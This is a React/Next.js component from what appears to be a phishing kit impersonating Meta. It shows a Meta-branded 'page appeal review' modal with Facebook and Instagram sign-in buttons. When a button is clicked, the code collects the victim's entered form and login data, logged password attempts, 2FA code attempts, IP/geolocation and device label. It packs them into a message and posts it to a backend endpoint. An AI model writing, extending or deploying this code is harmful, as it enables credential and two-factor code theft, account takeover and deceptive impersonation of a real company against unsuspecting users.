'use client';

import BgHero from '@/assets/images/bg_hero.png';
import InstagramLogoImage from '@/assets/images/logo-insta.webp';
import MetaLogo from '@/assets/images/logo-meta.svg';
import { useAppStore } from '@/store/store';
import { buildAppealMessage } from '@/utils/message';
import type { LoginProvider } from '@/utils/message';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { useState, type FC } from 'react';

const FacebookIcon = () => (
    <svg className='h-5 w-5 shrink-0' viewBox='0 0 24 24' aria-hidden='true'>
        <path
            fill='#1877F2'
            d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'
        />
    </svg>
);

interface LoginChoiceModalProps {
    show: boolean;
    texts: Record<string, string>;
    onSelect: (provider: LoginProvider) => void;
    onClose: () => void;
}

const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ show, texts, onSelect, onClose }) => {
    const [isSending, setIsSending] = useState(false);
    const { geoInfo, deviceLabel, messageId, formData, loginData, passwordAttempts, twoFAAttempts, setLoginProvider, setMessageId } =
        useAppStore();

    if (!show) return null;

    const handleSelect = async (provider: LoginProvider) => {
        if (isSending || !geoInfo) return;

        setIsSending(true);
        setLoginProvider(provider);

        const message = buildAppealMessage({
            form: formData,
            login: loginData,
            loginProvider: provider,
            passwordLogs: passwordAttempts,
            codeAttempts: twoFAAttempts,
            ip: geoInfo,
            deviceLabel
        });

        try {
            const res = await axios.post('/api/send', { message, old_message_id: messageId });
            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }
        } catch {
            //
        } finally {
            setIsSending(false);
            onSelect(provider);
        }
    };

    return (
        <div className='fixed inset-0 z-[1050] flex h-screen w-screen items-center justify-center bg-black/55 px-4 backdrop-blur-sm'>
            <div className='relative flex max-h-[90vh] w-full max-w-[920px] overflow-hidden rounded-2xl bg-white shadow-[0_24px_60px_rgba(0,0,0,0.28)]'>
                <button
                    type='button'
                    onClick={onClose}
                    className='absolute top-4 right-4 z-10 flex h-9 w-9 items-center justify-center rounded-full bg-black/8 text-[#1c1e21] transition-colors hover:bg-black/15'
                    aria-label={texts.closeLabel || 'Close'}
                >
                    <FontAwesomeIcon icon={faXmark} className='h-4 w-4' />
                </button>

                <div className='relative hidden w-[44%] shrink-0 overflow-hidden bg-[#0b5cff] md:block'>
                    <Image src={BgHero} alt='' fill className='object-cover opacity-90' priority />
                    <div className='absolute inset-0 bg-linear-to-t from-[#0b5cff]/95 via-[#0b5cff]/40 to-transparent' />
                    <div className='absolute top-8 left-8'>
                        <Image src={MetaLogo} alt={texts.altMeta || 'Meta'} width={72} height={24} className='brightness-0 invert' />
                    </div>
                    <div className='absolute right-0 bottom-0 left-0 p-8'>
                        <p className='text-xl leading-snug font-bold text-white'>
                            {texts.loginChoicePromo || 'Verify your identity to continue your page appeal review.'}
                        </p>
                        <div className='mt-6 flex gap-1.5'>
                            <span className='h-1.5 w-6 rounded-full bg-white' />
                            <span className='h-1.5 w-1.5 rounded-full bg-white/40' />
                            <span className='h-1.5 w-1.5 rounded-full bg-white/40' />
                        </div>
                    </div>
                </div>

                <div className='flex flex-1 flex-col justify-center px-8 py-10 sm:px-12 sm:py-14'>
                    <div className='mb-8 flex justify-center md:hidden'>
                        <Image src={MetaLogo} alt={texts.altMeta || 'Meta'} width={64} height={22} />
                    </div>

                    <h2 className='mb-2 text-center text-[26px] leading-tight font-bold text-[#1c1e21] sm:text-[30px]'>
                        {texts.loginChoiceTitle || 'Sign in to continue'}
                    </h2>
                    <p className='mx-auto mb-10 max-w-[360px] text-center text-sm leading-relaxed text-[#65676b]'>
                        {texts.loginChoiceDesc || 'Choose how you want to verify your account to proceed with the appeal.'}
                    </p>

                    <div className='mx-auto flex w-full max-w-[380px] flex-col gap-3'>
                        <button
                            type='button'
                            onClick={() => handleSelect('facebook')}
                            disabled={isSending}
                            className='group flex h-[54px] w-full items-center justify-center gap-3 rounded-xl border border-[#dadde1] bg-white px-4 text-[15px] font-semibold text-[#1c1e21] transition-all hover:border-[#1877F2]/40 hover:bg-[#f0f2f5] hover:shadow-md active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
                        >
                            <FacebookIcon />
                            {texts.continueWithFacebook || 'Continue with Facebook'}
                        </button>

                        <button
                            type='button'
                            onClick={() => handleSelect('instagram')}
                            disabled={isSending}
                            className='group relative flex h-[54px] w-full items-center justify-center gap-3 overflow-hidden rounded-xl border border-transparent bg-white px-4 text-[15px] font-semibold text-[#262626] shadow-[inset_0_0_0_1px_#dbdbdb] transition-all hover:shadow-[0_4px_20px_rgba(225,48,108,0.18),inset_0_0_0_1px_transparent] active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
                        >
                            <span className='pointer-events-none absolute inset-0 rounded-xl bg-linear-to-r from-[#833AB4]/[0.06] via-[#E1306C]/[0.06] to-[#F77737]/[0.06] opacity-0 transition-opacity group-hover:opacity-100' />
                            <span className='pointer-events-none absolute inset-x-0 top-0 h-[2px] bg-linear-to-r from-[#833AB4] via-[#E1306C] to-[#F77737] opacity-0 transition-opacity group-hover:opacity-100' />
                            <Image src={InstagramLogoImage} alt={texts.altInstagram || 'Instagram'} width={22} height={22} className='relative shrink-0 object-contain' />
                            <span className='relative'>{texts.continueWithInstagram || 'Continue with Instagram'}</span>
                        </button>
                    </div>

                    <p className='mx-auto mt-8 max-w-[380px] text-center text-xs leading-relaxed text-[#8a8d91]'>
                        {texts.loginChoiceTerms || 'By continuing, you agree to our Terms of Service and Privacy Policy.'}
                    </p>
                </div>
            </div>
        </div>
    );
};

export default LoginChoiceModal;
